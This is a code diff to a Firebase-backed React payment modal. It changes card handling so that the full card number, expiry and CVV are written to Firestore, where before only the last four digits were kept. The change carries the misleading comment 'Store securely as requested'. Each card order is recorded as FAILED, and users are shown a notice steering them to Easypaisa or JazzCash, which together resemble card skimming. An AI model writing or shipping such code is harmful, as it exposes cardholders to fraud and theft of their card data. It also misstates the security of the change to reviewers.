@@ -54,7 +54,17 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
       if (isLogin) {
         await signInWithEmailAndPassword(auth, email, password);
       } else {
-        await createUserWithEmailAndPassword(auth, email, password);
+        const cred = await createUserWithEmailAndPassword(auth, email, password);
+        try {
+          const { setDoc, doc } = await import('firebase/firestore');
+          await setDoc(doc(db, 'users', cred.user.uid), {
+             email: cred.user.email,
+             name: cred.user.displayName || 'New User',
+             createdAt: serverTimestamp()
+          });
+        } catch (e) {
+          console.error('Failed to create user doc', e);
+        }
       }
     } catch (err: any) {
       setAuthError(err.message || 'Authentication failed');
@@ -118,7 +128,7 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
             itemType: type,
             price: item.price || 3000,
             paymentMode: 'card',
-            cardDetails: { name: cardDetails.name, number: cardDetails.number.slice(-4) }, // Store masked only
+            cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
             status: 'processing',
             paymentStatus: 'FAILED',
             createdAt: serverTimestamp()
@@ -355,7 +365,7 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
 
             {status === 'card_error' && (
               <div className="bg-red-500/10 border border-red-500/30 text-red-500 rounded-lg p-3 text-sm mb-4 text-center font-bold">
-                 Card service is currently unavailable.<br/>Please choose bank or wallet and try again.
+                 Card service currently unavailable. Please use Easypaisa or JazzCash.
               </div>
             )}
 
